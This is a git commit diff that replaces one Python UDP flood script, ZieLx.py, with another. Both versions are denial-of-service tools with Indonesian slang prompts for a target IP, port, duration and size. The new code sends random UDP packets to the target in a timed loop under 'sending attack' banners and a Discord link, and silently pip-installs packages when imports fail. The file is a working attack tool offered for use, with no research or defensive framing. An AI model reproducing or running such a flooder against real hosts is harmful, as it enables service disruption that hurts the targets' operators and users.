9f0e7f42a36dfa9281c4ee7e39535cb94103ad61
notzielxxx2k <104568054+notzielxxx2k@users.noreply.github.com>
2022-04-29 10:03:12 +0700

    Update ZieLx.py

--- ZieLx.py
+++ ZieLx.py
@@ -1,73 +1,95 @@
+import os, sys, codecs
+
+try:
+    import socks, requests, wget, cfscrape, urllib3
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    else:
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+
+import os, sys, codecs
+
+try:
+    import socks, requests, wget, cfscrape, urllib3
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+    else:
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+
+from time import time as tt
 import threading
 import socket
 import random
-import sys
-import time 
-import os
-    
-except ImportError as e:
-    print(f"\033[1;31m[Kesalahan] \033[0m\xBB {e}")
-    sys.exit()
 
-def random_phrase():
-    ppl = ["ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "ZieLx", "Jangan Di Rename", "Kalo Mau Rename Pm Dc Gw"]
-    phrase = ["Jangan Di Pake", "Buat Abuse", "Digunakan Dengan", "Bijak", "Kalo Salah Tanggung", "Sendiri", "Jangan Disalahin Yang Punya", "Jangan Di Rename", "Kalo Mau Rename Ijin", "Masukan Type"]
-    return random.choice(ppl) + " " + random.choice(phrase)
+print("""\033[1;31;40m
 
-def banner():
-    print(f"""\033[2;31m
-     
-█████████████████████████████
-█░▄▄░▄█▄─▄█▄─▄▄─█▄─▄███▄─▀─▄█
-██▀▄█▀██─███─▄█▀██─██▀██▀─▀██
-▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄█▄▄▀{random_phrase()}
+█▀█ █▀ ▄▀█ ▀█▀ █ █▀█
+█▀▀ ▄█ █▀█ ░█░ █ █▀▄
+        WM BaDANF Akashv, Psatir7, ItzNone
+""")
+ip = str(input("\033[94m MASukIN AiPi LwUH BanHj \033[1;31;40m  ====> : "))
+port = int(input(" \033[94mMASukIN PortT LwUH BaNHJ \033[1;31;40m====> : "))
+time = int(input(" \033[94mWaKTuNYa BRaff CHuy? \033[1;31;40m      ====> : "))
+size = int(input("\033[94m ThreadsnYA BrAFF ChuY \033[1;31;40m    ====> : "))
 
-    \033[2;33mVersion: 2.3 \t Author : ZieLx \n\033[0m
-    """)
+brand = """\033[32m
 
-def Runher(ip, port, packet, index):
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀
+⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
+⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
+⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
+⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
+⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁ 
+                SEmDinG AttacK ChUY...
+            INGFO-INGFO https://discord.gg/XMWBZprZYe
+"""
+
+os.system("clear")
+def attack(ip, port, time, size):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[95m=+=+=+=+ Psatir Launched! +=+=+=+=")
+    fmt = '\033[91m  SemDanG MeNyATiR Ke ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    size = os.urandom(min(666, size))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        sock.sendto(random._urandom(1490), (ip, port))
-        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m Mengirim Paket Ke Ip And Port \033[1;35m{ip}\033[0m")
-
-def main():
-    try:
-        if sys.version_info[0] != 3:
-            print("\033[1;31m[Kesalahan] \033[0m\xBB Silakan jalankan Tools Ini menggunakan Python 3")
-            sys.exit()
-        
-        if len(sys.argv) < 5:
-            banner()
-
-        IP       = input("\033[1;34m[>] \033[2;32mMasukan Ip/Host Target \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
-        PORT     = int(input("\033[1;34m[>] \033[2;32mMasukan Port Target \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
-        PACKET     = int(input("\033[1;34m[>] \033[2;32mMasukan Jumlah Packet \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
-        THREAD    = int(input("\033[1;34m[>] \033[2;32mMasukan Jumlah Threads \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])
-
-
-        if PORT > 65535 or PORT < 1:
-            print("\n\033[1;31m[Kesalahan] \033[0m\xBB Silakan, pilih port antara 1 dan 65535")
-            sys.exit(1)
-
-        if PACKET > 65500 or PACKET < 1:
-            print("\n\033[1;31m[Kesalahan] \033[0m\xBB Silakan, pilih Packet antara 1 dan 65500")
-            sys.exit(1)
-
-    except KeyboardInterrupt:
-        print("\n\033[1;31m[!] \033[0m Keluar...")
-        sys.exit()
     
-    except Exception as e:
-        print(f"\n\033[1;31m[Kesalahan] \033[0m\xBB {e}")
-        sys.exit()
+    while True:
+        port = port or random.randint(1, 65535)
 
-    for i in range(THREAD):
-        try:
-            t = threading.Thread(target=Runher, args=(IP, PORT, PACKET, i))
-            t.start()
-        except Exception as e:
-            print(f"\n\033[1;31m[Kesalahan] \033[0m\xBB Terjadi kesalahan saat menginisialisasi threads {i}: {e}")            
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
 
-if __name__ == "__main__":
-    main()
+        sock.sendto(size, (ip, port))
+
+    print('\033[92mAttack Finished')
+
+if __name__ == '__main__':
+    try:
+        attack(ip, port, time, size)
+    except KeyboardInterrupt:
+        print('Attack stopped.')
